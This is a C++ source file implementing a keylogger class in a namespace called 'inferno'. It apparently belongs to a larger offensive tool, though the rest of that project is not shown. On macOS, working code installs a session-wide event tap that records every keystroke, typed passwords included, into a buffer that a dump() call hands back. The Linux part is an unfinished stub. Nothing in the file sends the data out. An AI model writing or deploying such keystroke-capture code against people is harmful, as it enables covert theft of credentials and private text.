#include "../include/KeyLogger.hpp"
#include <iostream>

#ifdef __APPLE__
#include <Carbon/Carbon.h>
#elif defined(__linux__)
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <dirent.h>
#endif

namespace inferno {

KeyLogger::KeyLogger() : m_running(false) {
#ifdef __APPLE__
    m_event_tap = nullptr;
    m_runloop_source = nullptr;
    m_runloop = nullptr;
#elif defined(__linux__)
    m_input_fd = -1;
#endif
}

KeyLogger::~KeyLogger() {
    stop();
}

bool KeyLogger::isRunning() const {
    return m_running;
}

std::string KeyLogger::dump() {
    std::lock_guard<std::mutex> lock(m_mutex);
    std::string current_buffer = std::move(m_buffer);
    m_buffer.clear();
    return current_buffer;
}

#ifdef INFERNO_TESTING
void KeyLogger::injectKeystroke(char c) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() < MAX_BUFFER_SIZE) {
        m_buffer.push_back(c);
    }
}
#endif

#ifdef __APPLE__

void KeyLogger::appendKeystroke(const std::string& stroke) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
        m_buffer += stroke;
    }
}

CGEventRef KeyLogger::eventCallback(CGEventTapProxy proxy, CGEventType type,
                                    CGEventRef event, void* refcon) {
    (void)proxy;
    if (type != kCGEventKeyDown) {
        return event;
    }

    KeyLogger* logger = static_cast<KeyLogger*>(refcon);
    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    
    // Convert keycode to string (simplified for demonstration, proper UCKeyTranslate could be used)
    std::string key_str;
    
    // Quick map for common keys
    if (keycode == 36) key_str = "[ENTER]";
    else if (keycode == 49) key_str = " ";
    else if (keycode == 51) key_str = "[BACKSPACE]";
    else if (keycode == 48) key_str = "[TAB]";
    else {
        // We use CGEventKeyboardGetUnicodeString
        UniChar chars[4];
        UniCharCount realLength;
        CGEventKeyboardGetUnicodeString(event, 4, &realLength, chars);
        if (realLength > 0) {
            // Very simple ASCII conversion for standard keys
            key_str = std::string(1, (char)chars[0]);
        } else {
            key_str = "[KEY:" + std::to_string(keycode) + "]";
        }
    }

    logger->appendKeystroke(key_str);
    return event;
}

void KeyLogger::start() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_running) return;

#ifdef INFERNO_TESTING
    std::cerr << "[KeyLogger] INFERNO_TESTING is active. Bypassing tap creation completely.\n";
    m_running = true;
    return;
#endif

    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    
    // Note: kCGHIDEventTap requires root or Accessibility permissions.
    // kCGSessionEventTap requires Accessibility permissions.
    m_event_tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap,
                                   kCGEventTapOptionDefault, eventMask,
                                   eventCallback, this);

    if (!m_event_tap) {
        std::cerr << "[KeyLogger] Failed to create CGEventTap. Needs Accessibility permissions.\n";
        return;
    }

    m_runloop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, m_event_tap, 0);
    m_running = true;

    // Platform Exception: Start the dedicated CFRunLoop thread
    m_runloop_thread = std::thread([this]() {
        m_runloop = CFRunLoopGetCurrent();
        CFRunLoopAddSource(m_runloop, m_runloop_source, kCFRunLoopCommonModes);
        CGEventTapEnable(m_event_tap, true);
        CFRunLoopRun(); // Blocks until CFRunLoopStop is called
    });
}

void KeyLogger::stop() {
    {
        std::lock_guard<std::mutex> lock(m_mutex);
        if (!m_running) return;
        m_running = false;
    }

    if (m_event_tap) {
        CGEventTapEnable(m_event_tap, false);
    }
    
    if (m_runloop_source && m_event_tap) {
        // Invalidate mach port stops the tap
        CFMachPortInvalidate(m_event_tap);
    }

    if (m_runloop) {
        CFRunLoopStop(m_runloop);
        m_runloop = nullptr;
    }

    if (m_runloop_thread.joinable()) {
        m_runloop_thread.join();
    }

    // Clean up resources that require thread safety
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_runloop_source) {
        CFRelease(m_runloop_source);
        m_runloop_source = nullptr;
    }
    if (m_event_tap) {
        CFRelease(m_event_tap);
        m_event_tap = nullptr;
    }
}

#elif defined(__linux__)

void KeyLogger::appendKeystroke(const std::string& stroke) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
        m_buffer += stroke;
    }
}

void KeyLogger::start() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_running) return;
    
    // For Linux, we would search /dev/input/eventX for a keyboard.
    // This requires root. We'll leave it as a stub that opens the first input for now.
    // Or we just mark it running and do nothing for the non-blocking polling design.
    // In a real implementation we'd open the correct fd and poll it in dump() or another loop.
    m_running = true;
    std::cerr << "[KeyLogger] Linux /dev/input KeyLogger started (stub).\n";
}

void KeyLogger::stop() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (!m_running) return;
    if (m_input_fd != -1) {
        ::close(m_input_fd);
        m_input_fd = -1;
    }
    m_running = false;
}

#endif

} // namespace inferno
